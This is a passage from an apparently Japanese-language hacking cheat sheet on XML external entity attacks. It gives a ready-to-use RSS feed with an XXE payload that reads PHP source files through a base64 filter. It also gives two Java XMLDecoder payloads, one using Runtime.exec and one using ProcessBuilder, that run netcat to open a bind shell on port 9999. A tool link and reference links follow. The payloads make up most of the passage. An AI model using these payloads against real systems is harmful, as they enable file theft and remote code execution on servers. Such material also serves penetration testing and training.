</channel>
</rss>
```
### ソースコードを読む

PHPのbase64フィルターを使用する
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoderは、XMLメッセージに基づいてオブジェクトを作成するJavaクラスです。悪意のあるユーザーがアプリケーションに**readObject**メソッドへの呼び出しで任意のデータを使用させることができれば、彼は瞬時にサーバー上でコード実行を得ることになります。

### Using Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## ツール

{{#ref}}
https://github.com/luisfontes19/xxexploiter
{{#endref}}

## 参考文献

- [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
- [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
- 自分の外部DTDを使用してHTTP経由で情報を抽出: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
- [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
- [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
- [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
- [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

{{#include ../banners/hacktricks-training.md}}
